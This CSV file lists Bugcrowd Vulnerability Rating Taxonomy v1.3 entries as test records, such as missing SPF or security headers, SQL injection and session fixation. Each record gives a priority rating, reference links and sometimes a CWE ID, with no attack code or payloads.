TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
BCVRT-011,BCVRT,Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record,Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record (P5),,3,,,,11,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-013,BCVRT,Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration,Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration (P3),,2,,,,13,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-012,BCVRT,Mail Server Misconfiguration: Missing SPF on Email Domain (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing SPF on Email Domain,Mail Server Misconfiguration: Missing SPF on Email Domain (P3),,2,,,,12,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-014,BCVRT,Mail Server Misconfiguration: Missing SPF on Non-Email Domain (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing SPF on Non-Email Domain,Mail Server Misconfiguration: Missing SPF on Non-Email Domain (P5),,3,,,,14,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-015,BCVRT,Mail Server Misconfiguration: SPF Uses a Soft Fail (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: SPF Uses a Soft Fail,Mail Server Misconfiguration: SPF Uses a Soft Fail (P5),,3,,,,15,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-016,BCVRT,Mail Server Misconfiguration: SPF Includes More Than 10 Lookups (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: SPF Includes More Than 10 Lookups,Mail Server Misconfiguration: SPF Includes More Than 10 Lookups (P5),,3,,,,16,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-017,BCVRT,Mail Server Misconfiguration: Missing DKIM/DMARC (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing DKIM/DMARC,Mail Server Misconfiguration: Missing DKIM/DMARC (P5),,3,,,,17,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-018,BCVRT,Lack of Password Confirmation: Change Email Address (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Change Email Address,Lack of Password Confirmation: Change Email Address (P4),,3,,,,18,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-019,BCVRT,Lack of Password Confirmation: Change Password (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Change Password,Lack of Password Confirmation: Change Password (P4),,3,,,,19,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-620,,,
BCVRT-020,BCVRT,Lack of Password Confirmation: Delete Account (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Delete Account,Lack of Password Confirmation: Delete Account (P4),,3,,,,20,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-021,BCVRT,Lack of Password Confirmation: Manage 2FA (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Manage 2FA,Lack of Password Confirmation: Manage 2FA (P5),,3,,,,21,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-022,BCVRT,No Rate Limiting on Form: Registration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Registration,No Rate Limiting on Form: Registration (P4),,3,,,,22,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-023,BCVRT,No Rate Limiting on Form: Login (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Login,No Rate Limiting on Form: Login (P3),,2,,,,23,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-307,,,
BCVRT-024,BCVRT,No Rate Limiting on Form: Email-Triggering (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Email-Triggering,No Rate Limiting on Form: Email-Triggering (P4),,3,,,,24,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-025,BCVRT,Unsafe File Upload: No Antivirus (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: No Antivirus,Unsafe File Upload: No Antivirus (P4),,3,,,,25,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-026,BCVRT,Unsafe File Upload: No Size Limit (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: No Size Limit,Unsafe File Upload: No Size Limit (P4),,3,,,,26,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-027,BCVRT,Unsafe File Upload: File Extension Filter Bypass (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: File Extension Filter Bypass,Unsafe File Upload: File Extension Filter Bypass (P5),,3,,,,27,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-434,,,
BCVRT-028,BCVRT,Cookie Scoped to Parent Domain (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Cookie Scoped to Parent Domain,Cookie Scoped to Parent Domain (P5),,3,,,,28,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-029,BCVRT,Missing Secure or HTTPOnly Cookie Flag: Session Token (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing Secure or HTTPOnly Cookie Flag: Session Token,Missing Secure or HTTPOnly Cookie Flag: Session Token (P4),,3,,,,29,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-030,BCVRT,Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie,Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie (P5),,3,,,,30,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-031,BCVRT,Clickjacking: Sensitive Action (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Clickjacking: Sensitive Action,Clickjacking: Sensitive Action (P4),,3,,,,31,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-032,BCVRT,Clickjacking: Non-Sensitive Action (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Clickjacking: Non-Sensitive Action,Clickjacking: Non-Sensitive Action (P5),,3,,,,32,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-033,BCVRT,OAuth Misconfiguration: Missing State Parameter (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; OAuth Misconfiguration: Missing State Parameter,OAuth Misconfiguration: Missing State Parameter (P4),,3,,,,33,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-352,,,
BCVRT-034,BCVRT,Captcha Bypass: Implementation Vulnerability (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Captcha Bypass: Implementation Vulnerability,Captcha Bypass: Implementation Vulnerability (P4),,3,,,,34,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-035,BCVRT,Captcha Bypass: Brute Force (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Captcha Bypass: Brute Force,Captcha Bypass: Brute Force (P5),,3,,,,35,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-036,BCVRT,Exposed Admin Portal: To Internet (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Exposed Admin Portal: To Internet,Exposed Admin Portal: To Internet (P5),,3,,,,36,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-037,BCVRT,Missing DNSSEC (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing DNSSEC,Missing DNSSEC (P5),,3,,,,37,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-038,BCVRT,Fingerprinting/Banner Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Fingerprinting/Banner Disclosure,Fingerprinting/Banner Disclosure (P5),,3,,,,38,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-039,BCVRT,Username Enumeration: Brute Force (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Username Enumeration: Brute Force,Username Enumeration: Brute Force (P5),,3,,,,39,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-040,BCVRT,Potentially Unsafe HTTP Method Enabled: OPTIONS (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Potentially Unsafe HTTP Method Enabled: OPTIONS,Potentially Unsafe HTTP Method Enabled: OPTIONS (P5),,3,,,,40,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-041,BCVRT,Potentially Unsafe HTTP Method Enabled: TRACE (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Potentially Unsafe HTTP Method Enabled: TRACE,Potentially Unsafe HTTP Method Enabled: TRACE (P5),,3,,,,41,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-042,BCVRT,Insecure SSL: Lack of Forward Secrecy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Insecure SSL: Lack of Forward Secrecy,Insecure SSL: Lack of Forward Secrecy (P5),,3,,,,42,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-043,BCVRT,Insecure SSL: Insecure Cipher Suite (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Insecure SSL: Insecure Cipher Suite,Insecure SSL: Insecure Cipher Suite (P5),,3,,,,43,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-326,,,
BCVRT-044,BCVRT,Reflected File Download (RFD) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Reflected File Download (RFD),Reflected File Download (RFD) (P5),,3,,,,44,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view,,,,
BCVRT-045,BCVRT,Lack of Security Headers: X-Frame-Options (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Frame-Options,Lack of Security Headers: X-Frame-Options (P5),,3,,,,45,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-046,BCVRT,Lack of Security Headers: Cache-Control for a Non-Sensitive Page (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Cache-Control for a Non-Sensitive Page,Lack of Security Headers: Cache-Control for a Non-Sensitive Page (P5),,3,,,,46,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-525,,,
BCVRT-047,BCVRT,Lack of Security Headers: X-XSS-Protection (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-XSS-Protection,Lack of Security Headers: X-XSS-Protection (P5),,3,,,,47,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-048,BCVRT,Lack of Security Headers: Strict-Transport-Security (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Strict-Transport-Security,Lack of Security Headers: Strict-Transport-Security (P5),,3,,,,48,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-049,BCVRT,Lack of Security Headers: X-Content-Type-Options (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Content-Type-Options,Lack of Security Headers,,2,,,,49,"The application does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.",,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,644,,,
BCVRT-050,BCVRT,Lack of Security Headers: Content-Security-Policy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Content-Security-Policy,Lack of Security Headers: Content-Security-Policy (P5),,3,,,,50,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-052,BCVRT,Lack of Security Headers: X-Content-Security-Policy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Content-Security-Policy,Lack of Security Headers: X-Content-Security-Policy (P5),,3,,,,52,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-055,BCVRT,Lack of Security Headers: Cache-Control for a Sensitive Page (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Cache-Control for a Sensitive Page,Lack of Security Headers: Cache-Control for a Sensitive Page (P4),,3,,,,55,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-525,,,
BCVRT-051,BCVRT,Lack of Security Headers: Public-Key-Pins (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Public-Key-Pins,Lack of Security Headers: Public-Key-Pins (P5),,3,,,,51,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-053,BCVRT,Lack of Security Headers: X-Webkit-CSP (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Webkit-CSP,Lack of Security Headers: X-Webkit-CSP (P5),,3,,,,53,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-054,BCVRT,Lack of Security Headers: Content-Security-Policy-Report-Only (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Content-Security-Policy-Report-Only,Lack of Security Headers: Content-Security-Policy-Report-Only (P5),,3,,,,54,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-056,BCVRT,Bitsquatting (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Bitsquatting,Bitsquatting (P5),,3,,,,56,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-057,BCVRT,File Inclusion: Local (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; File Inclusion: Local,File Inclusion: Local (P1),,2,,,,57,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-059,BCVRT,Remote Code Execution (RCE) (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Remote Code Execution (RCE),Remote Code Execution (RCE) (P1),,2,,,,59,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-77,,,
BCVRT-062,BCVRT,XML External Entity Injection (XXE) (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; XML External Entity Injection (XXE),XML External Entity Injection (XXE) (P1),,2,,,,62,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-611,true,,
BCVRT-058,BCVRT,Parameter Pollution: Social Media Sharing Buttons (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Parameter Pollution: Social Media Sharing Buttons,Parameter Pollution: Social Media Sharing Buttons (P5),,3,,,,58,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-061,BCVRT,SQL Injection: Blind (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; SQL Injection: Blind,SQL Injection: Blind (P1),,2,,,,61,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-063,BCVRT,HTTP Response Manipulation: Response Splitting (CRLF) (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; HTTP Response Manipulation: Response Splitting (CRLF),HTTP Response Manipulation: Response Splitting (CRLF) (P3),,2,,,,63,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-113,,,
BCVRT-060,BCVRT,SQL Injection: Error-Based (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; SQL Injection: Error-Based,SQL Injection: Error-Based (P1),,2,,,,60,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-064,BCVRT,Content Spoofing: iframe Injection (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: iframe Injection,Content Spoofing: iframe Injection (P3),,2,,,,64,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-068,BCVRT,Content Spoofing: Homograph/IDN-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Homograph/IDN-Based,Content Spoofing: Homograph/IDN-Based (P5),,3,,,,68,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-1007,,,
BCVRT-069,BCVRT,Authentication Bypass (P1),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Authentication Bypass,Authentication Bypass (P1),,2,,,,69,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-287,,,
BCVRT-070,BCVRT,Privilege Escalation,BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Privilege Escalation,Privilege Escalation,,2,,,,70,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-269,,,
BCVRT-066,BCVRT,Content Spoofing: Email HTML Injection (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Email HTML Injection,Content Spoofing: Email HTML Injection (P4),,3,,,,66,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-072,BCVRT,Session Fixation (P3),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Session Fixation,Session Fixation (P3),,2,,,,72,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-384,,,
BCVRT-073,BCVRT,Failure to Invalidate Session: On Logout (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Logout,Failure to Invalidate Session: On Logout (P4),,3,,,,73,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-065,BCVRT,Content Spoofing: External Authentication Injection (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: External Authentication Injection,Content Spoofing: External Authentication Injection (P4),,3,,,,65,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-067,BCVRT,Content Spoofing: Text Injection (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Text Injection,Content Spoofing: Text Injection (P5),,3,,,,67,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-071,BCVRT,Weak Login Function: Over HTTP (P3),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Weak Login Function: Over HTTP,Weak Login Function: Over HTTP (P3),,2,,,,71,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-074,BCVRT,Failure to Invalidate Session: On Password Reset (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Password Reset,Failure to Invalidate Session: On Password Reset (P4),,3,,,,74,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
